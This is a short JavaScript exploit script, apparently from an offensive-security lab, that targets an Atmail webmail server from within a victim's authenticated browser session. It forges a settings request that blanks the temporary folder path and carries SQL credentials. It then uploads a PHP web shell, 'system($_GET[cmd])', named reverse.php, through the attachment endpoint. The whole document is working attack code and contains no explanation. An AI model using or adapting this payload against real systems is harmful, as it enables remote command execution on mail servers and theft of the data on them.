var target = document.location.host;


function  pwnSettingtmpFolderBaseName() {
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://" + target + "/index.php/admin/settings/globalsave",true )
    xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhttp.send("save=1&fields%5Badmin_email%5D=admin%40offsec.local&fields%5Bsession_timeout%5D=120&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields%5BtmpFolderBaseName%5D=");
}

function upload() {
    var phpcode = '<?php system($_GET[cmd]);?>';
    var fileSize = phpcode.length;
    var boundary = "---------------------------19017469544236226903801135410";
    var uri = "http://" + target + "/index.php/mail/composemessage/addattachment/composeID/uid7cbb505cfe";
    xhr = new XMLHttpRequest();
    xhr.open("POST", uri,true)
    xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary);
    xhr.withCredentials = "true";
    var body = "";
    body += "--" + boundary + "\r\n";
    body += 'Content-Disposition: form-data; name="newAttachment"; filename="reverse.php"\r\n';
    body += 'Content-Type: application/x-php\r\n\r\n';
    body += phpcode + "\r\n";
    body += "--" + boundary + "--";
    xhr.send(body)
    return true;
}
pwnSettingtmpFolderBaseName();
upload();

